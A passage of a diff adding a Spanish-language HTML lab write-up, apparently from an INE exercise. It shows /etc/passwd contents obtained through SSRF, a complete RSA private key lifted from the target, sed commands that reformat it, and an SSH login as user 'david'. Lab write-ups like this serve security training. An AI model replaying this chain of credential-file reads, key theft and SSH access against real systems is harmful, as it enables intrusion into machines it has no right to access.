+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingn
+ ats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+ systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+ systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+ messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+ sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+ david:x:999:999:david:/home/david:/bin/bash
+ amanda:x:998:100:amanda:/home/amanda:/bin/bash
+ jeremy:x:997:100:jeremy:/home/jeremy:/bin/bash
+</code></pre></div></div>
+<p>debe pertenecer a un usuario que tenga una bash shell.</p>
+
+<p>configuración de la clave RSA:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:/var/www/html# <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/-----BEGIN RSA PRIVATE KEY-----/&amp;</span><span class="se">\n</span><span class="s2">/"</span>     <span class="nt">-e</span> <span class="s2">"s/-----END RSA PRIVATE KEY-----/</span><span class="se">\n</span><span class="s2">&amp;/"</span>     <span class="nt">-e</span> <span class="s2">"s/</span><span class="se">\S\{</span><span class="s2">64</span><span class="se">\}</span><span class="s2">/&amp;</span><span class="se">\n</span><span class="s2">/g"</span>     id_rsa
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+ MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB
+ Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N
+ MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0
+ BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9
+ E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5
+ lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t
+ MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN
+ /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD
+ M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u
+ n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw
+ r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX
+ KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu
+ WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5
+ yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q
+ Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/
+ 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv
+ aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P
+ TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt
+ 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x
+ uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj
+ E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A
+ kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU
+ rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ
+ zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k
+ 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+root@INE:/var/www/html# <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/-----BEGIN RSA PRIVATE KEY-----/&amp;</span><span class="se">\n</span><span class="s2">/"</span>     <span class="nt">-e</span> <span class="s2">"s/-----END RSA PRIVATE KEY-----/</span><span class="se">\n</span><span class="s2">&amp;/"</span>     <span class="nt">-e</span> <span class="s2">"s/</span><span class="se">\S\{</span><span class="s2">64</span><span class="se">\}</span><span class="s2">/&amp;</span><span class="se">\n</span><span class="s2">/g"</span>     id_rsa <span class="o">&gt;</span> access_rsa
+root@INE:/var/www/html# <span class="nb">chmod </span>600 access_rsa 
+</code></pre></div></div>
+
+<p>permisos y acceso :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:/var/www/html# ssh <span class="nt">-i</span> access_rsa david@demo.ine.local
+The authenticity of host <span class="s1">'demo.ine.local (192.200.245.3)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:/IaZaAYgv06clj6XTixGhPQCKrYvdxkCp2XdVvwdZt4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>demo.ine.local<span class="s1">' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the '</span>unminimize<span class="s1">' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+david@demo:~$ whoami
+david
+david@demo:~$ hostname
+demo.ine.local
+
+</span></code></pre></div></div>
+<p><img src="./assets/images/ssrf_ssh.png" alt="Acceso SSH" /></p>
 
 <p><a href="./">back</a></p>
 
